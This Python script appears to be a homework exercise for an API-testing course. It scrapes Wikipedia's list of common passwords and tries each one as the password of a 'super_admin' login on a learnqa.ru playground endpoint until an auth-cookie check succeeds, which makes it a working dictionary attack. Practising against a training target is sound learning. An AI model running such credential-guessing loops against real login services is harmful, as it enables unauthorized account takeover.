import requests
from selenium import webdriver
from bs4 import BeautifulSoup


def create_parse_html_page(page_name, soup):
    """Создает файл html и снимок страницы машины(принимает название машины и суп)"""
    with open(f'{page_name}' + '.html', 'w+', encoding='utf-8') as file:
        file.write(str(soup))


driver = webdriver.Chrome()
driver.get("https://en.wikipedia.org/wiki/List_of_the_most_common_passwords")
soup = driver.page_source
create_parse_html_page("wiki", soup)
driver.quit()

def get_all_password_from_wiki():
    with open("wiki.html") as fp:
        soup = BeautifulSoup(fp, "html.parser")
        text = soup.find_all("table")[1]
        all_password = text.find_all("td")
        return [el.text.strip() for el in all_password]


def get_secret_password_homework(password):
    payload = {"login": "super_admin", "password": password}
    response = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data=payload)
    return dict(response.cookies)


def check_auth_cookie(cookie):
    response = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies=cookie)
    return response.text


passwords = get_all_password_from_wiki()
for el in passwords:
    cook = get_secret_password_homework(el)
    text = check_auth_cookie(cook)
    if text != "You are NOT authorized":
        print(f"Get it, your password is {el}")
        break
